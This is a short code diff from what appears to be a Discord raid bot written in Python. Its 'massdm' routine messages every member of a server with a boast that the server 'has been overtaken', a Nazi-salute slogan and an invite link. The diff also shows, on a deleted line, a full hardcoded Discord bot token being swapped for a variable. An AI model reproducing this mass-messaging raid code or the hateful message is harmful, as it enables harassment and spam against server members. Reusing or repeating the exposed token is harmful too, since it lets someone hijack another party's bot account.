@@ -133,4 +133,4 @@ async def massdm(ctx):
             await member.send("Your server has been overtaken by ItWasntMe HEIL DA https://discord.gg/fDXsxnWJeR")
         except:pass
 
-bot.run("MTM5NjA2MjY0NzE1MzA3MDIxMw.GNBGzc.u9kDpNadknXvBvIJqZFdjFdiG2hCAvOTfzpd2Q")
+bot.run(token)
